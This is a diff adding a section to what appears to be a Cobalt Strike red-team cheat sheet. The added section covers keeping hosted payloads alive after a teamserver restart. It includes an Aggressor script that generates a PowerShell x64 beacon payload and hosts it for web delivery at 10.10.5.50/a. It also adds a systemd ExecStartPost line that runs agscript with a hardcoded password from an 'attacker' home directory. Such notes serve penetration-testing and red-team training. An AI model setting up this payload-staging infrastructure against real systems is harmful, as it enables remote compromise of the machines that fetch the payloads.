@@ -91,6 +91,47 @@ sudo systemctl status csteamserver.service
 sudo systemctl enable teamserver.service
 ```
 
+### Persisten hosted files
+- Hosted files are gone on restart. A solution is to use `agscript` utility with the `artifact_payload` and `site_host` functions.
+```
+agscript <HOST> <PORT> <USER> <PASSWORD> <path/to/script.cna>
+
+vim host_payloads.cna
+
+# Connected and ready
+on ready {
+
+    # Generate payload
+    $payload = artifact_payload("<LISTENER NAME>", "<PAYLOAD TYPE>", "<PAYLOAD ARCHITECTURE>");
+
+    # Host payload
+    site_host("<LOCAL IP>", <PORT>, "<URI>", $payload, "<MIME TYPE>", "<DESCRIPTION>", <HTTPS [true|false]>);
+}
+```
+
+```
+vim host_payloads.cna
+
+# Connected and ready
+on ready {
+
+    # Generate payload
+    $payload = artifact_payload("http", "powershell", "x64");
+
+    # Host payload
+    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
+    ...
+}
+```
+
+#### Add to startup service
+- Add the following line
+```
+sudo vim /etc/systemd/system/csteamserver.service
+
+ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
+```
+
 ## Listeners
 ### Create a listener
 - Two type of listeners: `egress` (HTTP(S) and DNS) and `peer-to-peer` (SMB or TCP).
